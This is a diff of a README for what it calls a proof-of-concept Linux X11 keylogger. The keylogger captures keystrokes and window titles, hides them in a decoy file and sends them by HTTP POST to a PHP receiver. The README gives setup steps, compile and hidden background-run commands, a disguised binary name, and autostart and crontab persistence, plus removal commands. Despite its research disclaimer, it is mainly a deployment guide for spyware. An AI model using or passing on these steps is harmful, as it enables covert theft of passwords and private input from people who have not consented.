@@ -1,22 +1,10 @@
-# 🐧 Linux X11 Keystroke Logger & Exfiltration Framework
+# Linux X11 Keystroke Logger & Exfiltration
 
-> A lightweight Proof-of-Concept (PoC) security research tool for Linux environments running the X11 windowing system, demonstrating keystroke capture, window context tracking, persistence mechanisms, and remote data exfiltration over HTTP.
+Proof-of-concept security research tool for Linux systems running the X11 windowing system. Demonstrates user-space input tracking, active window logging, persistence hooks, and periodic HTTP POST exfiltration.
 
-[![Platform](https://img.shields.io/badge/Platform-Linux%20(X11)-orange?style=for-the-badge&logo=linux&logoColor=white)](https://www.x.org/)
-[![Language](https://img.shields.io/badge/Language-C-00599C?style=for-the-badge&logo=c&logoColor=white)](https://en.wikipedia.org/wiki/C_(programming_language))
-[![Network](https://img.shields.io/badge/Exfiltration-libcurl%20%7C%20HTTP%20POST-green?style=for-the-badge&logo=curl&logoColor=white)](https://curl.se/libcurl/)
-[![Backend](https://img.shields.io/badge/Receiver-PHP-777BB4?style=for-the-badge&logo=php&logoColor=white)](https://www.php.net/)
-[![Purpose](https://img.shields.io/badge/Purpose-Security%20Research-red?style=for-the-badge)](https://en.wikipedia.org/wiki/Penetration_test)
+> **Disclaimer**: This project is developed strictly for educational purposes, authorized security auditing, and red-team research. Unauthorized deployment or monitoring on systems without explicit prior consent is illegal.
 
----
-
-> [!CAUTION]
-> **Educational & Research Disclaimer**:
-> This repository is intended strictly for educational, security auditing, and authorized red-team assessment purposes. Unauthorized monitoring, data interception, or deployment on devices without explicit prior authorization is strictly prohibited and illegal under computer fraud and cybercrime legislation.
-
----
-
-## 🏗️ Architecture & Flow
+## Architecture
 
 ```mermaid
 sequenceDiagram
@@ -29,105 +17,93 @@ sequenceDiagram
 
     Target->>Client: Keystrokes & Active Window Switch
     Client->>Local: Append [Window Title] & Keys
-    Note over Client: Exfiltration interval triggers (300s)
+    Note over Client: Exfiltration timer triggers (300s)
     Client->>Server: HTTP POST (IP, Machine ID, Captured Data)
     Server->>Logs: Store payload & timestamp
     Server-->>Client: 200 OK
     Client->>Local: Clear local buffer
 ```
 
----
+## Features
 
-## ✨ Key Features & Capabilities
+- **X11 Window Context Tracking:** Intercepts active window focus via `XGetInputFocus` and `XFetchName` to log application titles alongside captured keystrokes.
+- **Keycode Translation:** Queries keyboard state using `XQueryKeymap` and maps keysyms to human-readable strings via `XKeysymToString`.
+- **Persistence Hooks:**
+  - XDG Autostart: Writes `~/.config/autostart/system_drivers.desktop`.
+  - Crontab: Appends a `@reboot` entry to the current user's crontab.
+- **Local Buffer:** Temporarily stores captured keystrokes in `~/Documents/requirements.txt`.
+- **HTTP Exfiltration:** Sends periodic multipart HTTP POST payloads to a remote server using `libcurl`.
+- **Server Telemetry Receiver:** Minimal PHP script (`receiver.php`) that logs client IP, username, timestamp, and payload into organized log files.
 
-- **🖥️ X11 Window Context Tracking**: Hooks into the X11 display using `XGetInputFocus` and `XFetchName` to log window title changes, providing critical context for captured input (e.g., distinguishing web browser sessions from terminal windows).
-- **⌨️ Raw Keycode Mapping**: Queries the low-level keyboard matrix via `XQueryKeymap`, mapping keycodes to human-readable strings and key symbols using `XKeysymToString`.
-- **🔄 System Persistence Mechanisms**:
-  - **XDG Autostart**: Generates `~/.config/autostart/system_drivers.desktop` to launch alongside user desktop sessions.
-  - **Crontab `@reboot`**: Installs an entry into the user's crontab for reboot survivability.
-- ** disguise Local Storage**: Stores local buffered keystrokes inside `~/Documents/requirements.txt` to blend in with normal developer workspaces.
-- **🌐 HTTP Exfiltration**: Dispatches periodic multi-part HTTP POST payloads to a designated endpoint using `libcurl`.
-- **📥 PHP Telemetry Receiver**: Ingests payloads, categorizes logs by source IP, username, and timestamp, and writes them to a protected log directory.
+## Project Structure
 
----
-
-## 📁 Repository Structure
-
-```
+```text
 keylogger-linux/
-├── main.c           # Core C client implementation (X11 event hooks, persistence, curl)
-├── keylogger.sh     # Automation script for GCC verification, compilation & background run
-├── receiver.php     # Server-side endpoint for receiving and archiving exfiltrated data
-└── README.md        # Technical documentation & usage guide
+├── main.c           # Core C client (X11 event loop, persistence, libcurl)
+├── keylogger.sh     # Build and background execution script
+├── receiver.php     # Server-side reception endpoint
+└── README.md        # Documentation
 ```
 
----
+## Requirements
 
-## 🛠️ Requirements & Dependencies
-
-### Client (Target Machine)
-- Linux environment running **X11** (X.Org Display Server)
+### Client
+- Linux running X11 (X.Org)
 - GCC compiler
 - `libX11` development headers
 - `libcurl` development headers
 
-#### Debian / Ubuntu / Mint:
+Debian / Ubuntu:
 ```bash
 sudo apt update && sudo apt install -y build-essential libx11-dev libcurl4-openssl-dev
 ```
 
-#### Arch Linux / Manjaro:
+Arch Linux:
 ```bash
 sudo pacman -S --needed gcc make libx11 curl
 ```
 
-### Server (C2 / Receiver)
-- PHP 7.4+ or 8.x
-- Any web server (Apache, Nginx, LiteSpeed, Caddy)
+### Server
+- PHP 7.4+
+- Any web server (Apache, Nginx, Caddy)
 
----
+## Setup and Deployment
 
-## 🚀 Setup & Deployment
-
-### 1. Configure the Receiver Server
-1. Upload `receiver.php` to your web server document root (e.g., `https://your-domain.com/receiver.php`).
-2. Ensure write permissions exist for the logs directory:
-   ```bash
-   mkdir -p logs
-   chmod 775 logs
-   ```
-
-### 2. Configure the Client
-Open `main.c` and specify your receiver's domain name or IP address:
-
-```c
-#define SERVER "your-domain.com"     // Receiver DNS record or IP (without http:// or https://)
-#define SCRIPT_PATH "/receiver.php"  // Remote receiver endpoint path
-#define UPLOAD_INTERVAL 300          // Exfiltration interval in seconds (default: 5 min)
+### 1. Server Configuration
+Upload `receiver.php` to your web server document root and ensure write permissions for the `logs/` directory:
+```bash
+mkdir -p logs
+chmod 775 logs
 ```
 
-### 3. Build & Execution
+### 2. Client Configuration
+Edit the target server address in `main.c`:
+```c
+#define SERVER "your-domain.com"     // Server domain or IP without http://
+#define SCRIPT_PATH "/receiver.php"  // Endpoint path
+#define UPLOAD_INTERVAL 300          // Interval in seconds
+```
 
-#### Option A: Automated Build Script (`keylogger.sh`)
+### 3. Compilation & Run
+
+Automated:
 ```bash
 chmod +x keylogger.sh
 ./keylogger.sh
 ```
 
-#### Option B: Manual Compilation
+Manual:
 ```bash
 gcc -o system_drivers main.c -lcurl -lX11 -Wall -Wno-stringop-truncation -Wno-format-truncation
 nohup ./system_drivers >/dev/null 2>&1 &
 ```
 
----
+## Remediation & Removal
 
-## 🧹 Detection & Remediation
-
-To terminate the process and purge persistent entries created by the client:
+To terminate the process and purge all artifacts:
 
 ```bash
-# 1. Terminate running process
+# 1. Stop background process
 pkill -f system_drivers
 
 # 2. Remove desktop autostart entry
@@ -140,8 +116,6 @@ crontab -l | grep -v 'system_drivers' | crontab -
 rm -f ~/system_drivers ~/Documents/requirements.txt
 ```
 
----
+## License
 
-## 📄 License
-
-This repository is distributed under the MIT License for educational and research usage.
+MIT
